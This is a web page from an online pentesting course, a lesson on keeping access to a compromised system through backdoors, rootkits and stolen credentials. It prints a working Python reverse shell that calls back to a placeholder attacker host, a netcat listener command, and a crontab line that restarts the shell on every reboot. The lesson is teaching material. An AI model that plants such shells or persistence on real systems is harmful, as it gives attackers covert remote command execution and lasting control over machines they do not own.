<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintaining Access</title>

    <link rel="alternate" href="https://campusempresa.com/pentesting/mantenimiento-acceso" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/pentesting/mantenimiento-acceso" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/pentesting/mantenimiento-acceso" hreflang="en" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body>
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-8 p-0">
			<h1 class="m-0 p-0">
				<a href="/"><img src="/img/logo_header.png" style="visibility:hiddenxx;"></a>
			</h1>
		</div>
		<div class="col-4 p-0 text-end">
			<h2 id="main_title"><cite>Building today's and tomorrow's society</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-0 m-0 text-end">
													<b id="lit_lang_es" class="px-2">EN</b>
				|
				<a href="https://campusempresa.com/pentesting/mantenimiento-acceso" class="px-2">ES</a></b>
				|
				<a href="https://campusempresa.cat/pentesting/mantenimiento-acceso" class="px-2">CA</a>
					</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/objective">The Project</a>
				<a href="/about">About Us</a>
				<a href="/contribute">Contribute</a>
				<a href="/donate">Donations</a>
				<a href="/licence">License</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content"><div class='content'><p>In this section of the Pentesting course, we will focus on maintaining access. This is a crucial step in the penetration testing process as it allows pentesters to maintain their presence in the target system after gaining initial access. This is essential for conducting deeper analysis and gathering additional information.</p>
</div><h1>Objectives of Maintaining Access</h1>
<div class='content'><ul>
<li><strong>Persistence</strong>: Ensure that access to the system is maintained even after reboots or network changes.</li>
<li><strong>Evasion</strong>: Avoid detection by security systems and administrators.</li>
<li><strong>Control</strong>: Maintain the ability to execute commands and extract data from the compromised system.</li>
</ul>
</div><h1>Common Techniques for Maintaining Access</h1>
<div class='content'></div><h2>Backdoors</h2>
<div class='content'><p>Backdoors are methods to access a system that bypass normal authentication. They can be installed on the compromised system to allow future access.</p>
<ul>
<li><strong>Types of Backdoors</strong>:
<ul>
<li><strong>Reverse shells</strong>: The compromised system connects back to the attacker.</li>
<li><strong>Bind shells</strong>: The attacker connects directly to the compromised system.</li>
</ul>
</li>
</ul>
<h4>Example of a Reverse Shell in Python</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiYXR0YWNrZXJfaXAiLCA0NDQ0KSkKCndoaWxlIFRydWU6CiAgICBjb21tYW5kID0gcy5yZWN2KDEwMjQpLmRlY29kZSgpCiAgICBpZiBjb21tYW5kLmxvd2VyKCkgPT0gImV4aXQiOgogICAgICAgIGJyZWFrCiAgICBvdXRwdXQgPSBzdWJwcm9jZXNzLnJ1bihjb21tYW5kLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlKQogICAgcy5zZW5kKG91dHB1dC5zdGRvdXQgKyBvdXRwdXQuc3RkZXJyKQoKcy5jbG9zZSgp"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((&quot;attacker_ip&quot;, 4444))

while True:
    command = s.recv(1024).decode()
    if command.lower() == &quot;exit&quot;:
        break
    output = subprocess.run(command, shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)

s.close()</pre></div><div class='content'></div><h2>Rootkits</h2>
<div class='content'><p>Rootkits are tools that allow attackers to maintain access and hide their presence on the compromised system.</p>
<ul>
<li><strong>Types of Rootkits</strong>:
<ul>
<li><strong>Kernel-level</strong>: Modify the operating system kernel.</li>
<li><strong>User-level</strong>: Operate in user space and are easier to detect.</li>
</ul>
</li>
</ul>
</div><h2>Stolen Credentials</h2>
<div class='content'><p>The use of stolen credentials is a common technique to maintain access. Attackers can capture credentials through keyloggers, phishing, or exploits.</p>
<ul>
<li><strong>Capture Methods</strong>:
<ul>
<li><strong>Keyloggers</strong>: Record keystrokes.</li>
<li><strong>Phishing</strong>: Trick users into revealing their credentials.</li>
<li><strong>Exploits</strong>: Exploit vulnerabilities to obtain credentials.</li>
</ul>
</li>
</ul>
</div><h1>Popular Tools for Maintaining Access</h1>
<div class='content'><p>| Tool               | Description                                                                 | Main Use            |
|--------------------|-----------------------------------------------------------------------------|---------------------|
| Metasploit         | Pentesting framework that includes modules for backdoors and persistence.   | Reverse shells      |
| Empire             | Post-exploitation framework that facilitates persistence and evasion.       | Persistence         |
| Cobalt Strike      | Adversary simulation platform that includes access tools.                   | Control and evasion |</p>
</div><h1>Practical Exercise</h1>
<div class='content'></div><h2>Objective</h2>
<div class='content'><p>Install a reverse shell on a test system and maintain access after a reboot.</p>
</div><h2>Steps</h2>
<div class='content'><ol>
<li>
<p><strong>Configure the Listener</strong>:</p>
<ul>
<li>On the attacker system, configure a listener using Netcat:
<pre><code class="language-bash">nc -lvp 4444
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Create the Reverse Shell</strong>:</p>
<ul>
<li>On the target system, create a reverse shell script in Python (like the example above).</li>
</ul>
</li>
<li>
<p><strong>Automate Persistence</strong>:</p>
<ul>
<li>Create a startup script on the target system to execute the reverse shell at startup:
<pre><code class="language-bash">echo &quot;@reboot python /path/to/reverse_shell.py&quot; &gt;&gt; /etc/crontab
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Reboot the System</strong>:</p>
<ul>
<li>Reboot the target system and verify that access is maintained.</li>
</ul>
</li>
</ol>
</div><h1>Conclusion</h1>
<div class='content'><p>Maintaining access is a critical stage in pentesting that allows attackers to conduct continuous and deep analysis on the compromised system. Understanding and applying techniques such as backdoors, rootkits, and the use of stolen credentials is essential for any pentester. Additionally, the use of specialized tools can greatly facilitate this process. Practicing these techniques in controlled environments is fundamental to developing effective and safe skills.</p>
</div></div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Advertising</h1>
			<p>This space is reserved for advertising.</p>
			<p>If you want to be a sponsor, contact us to include links in this area: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>Thank you for collaborating!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. All rights reserved</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir galetes per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Entès!</a>
    <a href="/cookies">Més informació</a>
</div>	

	</div>    
</body>
</html>
